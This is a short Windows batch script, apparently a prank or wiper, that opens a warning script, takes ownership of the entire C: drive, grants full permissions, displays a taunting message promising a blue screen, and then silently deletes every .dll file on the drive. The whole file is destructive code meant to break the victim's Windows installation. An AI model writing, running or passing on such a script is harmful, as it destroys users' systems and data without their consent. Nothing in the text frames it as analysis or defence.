@echo off
cd /d "%USERPROFILE%\desktop\8088
start warning.vbs
pause
msg * locating all files, this may take a while...
takeown C:\ /a /r /d y >nul
icacls C:\* /grant Adminstrators:F /t /c /q >nul
echo file access granted...
echo this is gonna be the last message you ever see on your computer before BSOD :)
cd C:\
timeout /t 1 >nul
del *.dll /s /f /q >nul 2>&1
